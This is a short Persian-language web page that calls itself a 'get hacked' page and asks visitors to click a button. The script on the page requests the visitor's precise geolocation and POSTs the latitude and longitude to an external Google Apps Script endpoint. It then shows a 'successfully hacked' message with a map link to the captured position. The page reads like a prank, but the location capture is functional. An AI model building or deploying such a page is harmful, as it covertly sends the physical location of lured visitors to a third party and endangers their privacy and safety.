<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>هک شو</title>
</head>

<body>

  <h2>اینجا هک میشی</h2>

  <p>
    فقط کافیه رو دکمه کلیک کنی.
  </p>

  <button onclick="getLocation()">اینجا</button>

  <p id="result"></p>

  <script>
    const SCRIPT_URL =
      "https://script.google.com/macros/s/AKfycbyOkaPgf6DbIk9xnIpk_GyyE1fIDTxayLrJvztmbkALjXuBdCTvYwwPo9I6fZD_Q9uYeQ/exec";

    function getLocation() {
      const result = document.getElementById("result");

      if (!navigator.geolocation) {
        result.innerText =
          "شما هک نمیشوید.";
        return;
      }

      result.innerText = "در حال هک شدن...";

      navigator.geolocation.getCurrentPosition(
        function(position) {

          const lat = position.coords.latitude;
          const lon = position.coords.longitude;


          result.innerText = "شوخی ندارم...";

          fetch(SCRIPT_URL, {
            method: "POST",
            headers: {
              "Content-Type": "text/plain;charset=utf-8"
            },
            body: JSON.stringify({
              latitude: lat,
              longitude: lon
            })
          })
          .then(response => response.text())
          .then(data => {

            result.innerHTML =
              " با موفقیت هک شدید.<br><br>" +
              '<a target="_blank" href="https://www.google.com/maps?q=' +
              encodeURIComponent(lat + "," + lon) +
              '">' +
              "اگه هنوزم شک داری کلیک کن" +
              "</a>";

          })
          .catch(error => {

            console.error("خطا:", error);

            result.innerText =
              "موقعیت دریافت شد، اما ارسال آن ناموفق بود.";

          });
        },

        function(error) {

          switch (error.code) {

            case error.PERMISSION_DENIED:
              result.innerText =
                "دسترسی به موقعیت مکانی رد شد.";
              break;

            case error.POSITION_UNAVAILABLE:
              result.innerText =
                "موقعیت مکانی در دسترس نیست.";
              break;

            case error.TIMEOUT:
              result.innerText =
                "دریافت موقعیت بیش از حد طول کشید.";
              break;

            default:
              result.innerText =
                "خطای نامشخص در دریافت موقعیت.";
          }
        },

        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }
  </script>

</body>
</html>
